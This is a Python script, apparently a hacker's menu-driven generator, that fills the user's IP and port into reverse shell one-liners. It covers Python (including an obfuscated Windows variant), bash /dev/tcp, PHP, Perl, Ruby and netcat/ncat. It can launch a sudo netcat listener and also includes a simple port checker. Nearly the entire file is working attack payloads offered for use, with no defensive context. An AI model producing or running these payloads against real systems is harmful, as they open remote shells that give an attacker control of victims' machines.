import time
import os
import socket
# -*- coding: utf-8 -*-

print("██████╗ ███████╗██╗   ██╗███████╗██████╗ ███████╗███████╗    ███████╗██╗  ██╗███████╗██╗     ██╗")
time.sleep(0.3)
print("██╔══██╗██╔════╝██║   ██║██╔════╝██╔══██╗██╔════╝██╔════╝    ██╔════╝██║  ██║██╔════╝██║     ██║")     
time.sleep(0.3)
print("██████╔╝█████╗  ██║   ██║█████╗  ██████╔╝███████╗█████╗      ███████╗███████║█████╗  ██║     ██║")     
time.sleep(0.3)
print("██╔══██╗██╔══╝  ╚██╗ ██╔╝██╔══╝  ██╔══██╗╚════██║██╔══╝      ╚════██║██╔══██║██╔══╝  ██║     ██║")     
time.sleep(0.3)
print("██║  ██║███████╗ ╚████╔╝ ███████╗██║  ██║███████║███████╗    ███████║██║  ██║███████╗███████╗███████╗")
time.sleep(0.3)
print("╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝\n")
print( """Select from the menu: \n 1) Python reverse shell\n 2) bash reverse shell\n 3) PHP reverse shell\n 4) Perl Reverse shell\n 5) Rubby Reverse shell\n 6) Ncat Reverse shell\n 7) If You want to check the Port status target """)
choise = input(": ") 
def hola( choise ):
    if choise == '1':
        os.system("clear")
        print("[+] Python Reverse shell")
        Target = input("Wat is operating system Target : [ 1)-Linux, 2)Windows, ]: ")
        if Target == '1':
            os.system("clear")
            ipaddr = input("[+] Entre Your ip adress: ")
            port = input("[+] Entre Your Port: ")
            Payload1 = (""" python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"[IPADDR]\",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'\n"""+"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[IPADDR]",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'"""+"""\n[+] Python Version 3 Payloads: \n""" + """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[IPADDR]",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'\n""" + """PYTHON3 REVERSE SHELL|python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[IPADDR]",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'""")
            payload = Payload1.replace("[PORT]", port )
            payload2 = payload.replace("[IPADDR]", ipaddr )
            print (payload2)
            c = input("press \"t\" to listen on that port: ")
            if c == 't':
                os.system('sudo nc -lvp'+port)
                
        elif Target == '2':
            os.system("clear")
            ipaddr = input("[+] Entre Your ip adress: ")
            port = input("[+] Entre Your Port: ")
            Payload1 = ("""C:\\Python27\\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('[IPADDR]', [PORT])), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))\"""")
            payload = Payload1.replace("[PORT]", port )
            payload2 = payload.replace("[IPADDR]", ipaddr )
            print (payload2)
            c = input("press \"t\" to listen on that port: ")
            if c == 't':
                os.system('sudo nc -lvp'+port)

    if choise == '2':
        os.system("clear")
        ipaddr = input("[+] Entre Your ip adress: ")
        port = input("[+] Entre Your Port: ")
        Payload1 = ("""bash -i >& /dev/tcp/[IPADDR]/[PORT] 0>&1\n"""+"""0<&196;exec 196<>/dev/tcp/[IPADDR]/[PORT]; sh <&196 >&196 2>&196\n"""+"""exec 5<> /dev/tcp/[IPADDR]/[PORT]; cat <&5 | while read line; do $line 2>&5>&5; done""")
        payload = Payload1.replace("[PORT]", port )
        payload2 = payload.replace("[IPADDR]", ipaddr )
        print (payload2)
        c = input("press \"t\" to listen on that port: ")
        if c == 't':
            os.system('sudo nc -lvp'+port)

    if choise == '3':
        os.system("clear")
        ipaddr = input("[+] Entre Your ip adress: ")
        port = input("[+] Entre Your Port: ")
        Payload1 = ("""php -r '$sock=fsockopen("[IPADDR]",[PORT]);exec("/bin/sh -i <&3 >&3 2>&3");'\n"""+"""php -r '$s=fsockopen("[IPADDR]",[PORT]);shell_exec("/bin/sh -i <&3 >&3 2>&3");'\n"""+"""php -r '$s=fsockopen("[IPADDR]",[PORT]);`/bin/sh -i <&3 >&3 2>&3`;'\n"""+"""php -r '$s=fsockopen("[IPADDR]",[PORT]);system("/bin/sh -i <&3 >&3 2>&3");'\n"""+"""php -r '$s=fsockopen("[IPADDR]",[PORT]);popen("/bin/sh -i <&3 >&3 2>&3", "r");'\n"""+"""php -r '$sock=fsockopen("[IPADDR]",[PORT]); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);'""")
        payload = Payload1.replace("[PORT]", port )
        payload2 = payload.replace("[IPADDR]", ipaddr )
        print (payload2)
        c = input("press \"t\" to listen on that port: ")
        if c == 't':
            os.system('sudo nc -lvp'+port)

    if choise == '4':
        print("[+] Python Perl shell")
        Target = input("Wat is operating system Target : [ 1)-Linux, 2)Windows, ]: ")
        if Target == '1':
            os.system("clear")
            ipaddr = input("[+] Entre Your ip adress: ")
            port = input("[+] Entre Your Port: ")
            Payload1 = ("""perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'\n"""+"""perl -e 'use Socket;$i="[IPADDR]";$p=[PORT];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"""+"""""")
            payload = Payload1.replace("[PORT]", port )
            payload2 = payload.replace("[IPADDR]", ipaddr )
            print (payload2)
            c = input("press \"t\" to listen on that port: ")
            if c == 't':
                os.system('sudo nc -lvp'+port)

        elif Target == '2' :
            os.system("clear")
            ipaddr = input("[+] Entre Your ip adress: ")
            port = input("[+] Entre Your Port: ")
            Payload1 = ("""perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'""")
            payload = Payload1.replace("[PORT]", port )
            payload2 = payload.replace("[IPADDR]", ipaddr )
            print(payload2)
            c = input("press \"t\" to listen on that port: ")
            if c == 't':
                os.system('sudo nc -lvp'+port)

    if choise == '5':
        print("[+] Python Perl shell")
        Target = input("Wat is operating system Target : [ 1)-Linux, 2)Windows, ]: ")
        if Target == '1':
            os.system("clear")
            ipaddr = input("[+] Entre Your ip adress: ")
            port = input("[+] Entre Your Port: ")
            Payload1 = ("""ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'\n"""+"""ruby -rsocket -e'f=TCPSocket.open("[IPADDR]",[PORT]).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""")
            payload = Payload1.replace("[PORT]", port )
            payload2 = payload.replace("[IPADDR]", ipaddr )
            print (payload2)
            c = input("press \"t\" to listen on that port: ")
            if c == 't':
                os.system('sudo nc -lvp'+port)

        elif Target == '2' :
            os.system("clear")
            ipaddr = input("[+] Entre Your ip adress: ")
            port = input("[+] Entre Your Port: ")
            Payload1 = ("""ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'""")
            payload = Payload1.replace("[PORT]", port )
            payload2 = payload.replace("[IPADDR]", ipaddr )
            print(payload2)
            c = input("press \"t\" to listen on that port: ")
            if c == 't':
                os.system('sudo nc -lvp'+port)

    if choise == '6':
        os.system("clear")
        ipaddr = input("[+] Entre Your ip adress: ")
        port = input("[+] Entre Your Port: ")
        Payload1 = ("""nc -c /bin/sh [IPADDR] [PORT]\n"""+"""nc -e /bin/sh [IPADDR] [PORT]\n"""+"""/bin/sh | nc [IPADDR] [PORT]"""+"""rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IPADDR] [PORT] >/tmp/f\n"""+"""rm -f /tmp/p; mknod /tmp/p p && nc [IPADDR] [PORT] 0/tmp/p\n"""+"""ncat [IPADDR] [PORT] -e /bin/sh""")
        payload = Payload1.replace("[PORT]", port )
        payload2 = payload.replace("[IPADDR]", ipaddr )
        print (payload2)
        c = input("press \"t\" to listen on that port: ")
        if c == 't':
            os.system('sudo nc -lvp'+port)


            
    

                    
hola(choise)

if choise == '7':
    os.system("clear")
    ip = input("Entre Ip Target: ")
    port = input("Entre Port Target: ")
    retry = 3
    delay = 5
    timeout = 3


    def isOpen(ip, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        try:
                s.connect((ip, int(port)))
                s.shutdown(socket.SHUT_RDWR)
                return True
        except:
                return False
        finally:
                s.close()

    def checkHost(ip, port):
        ipup = False
        for i in range(retry):
                if isOpen(ip, port):
                        ipup = True
                        break
                else:
                        time.sleep(i)
        return ipup

    if checkHost(ip, port):
        print ("[+] "+ip + " is UP")
    else:
        print ("[-] "+ip + " Is not up")
        


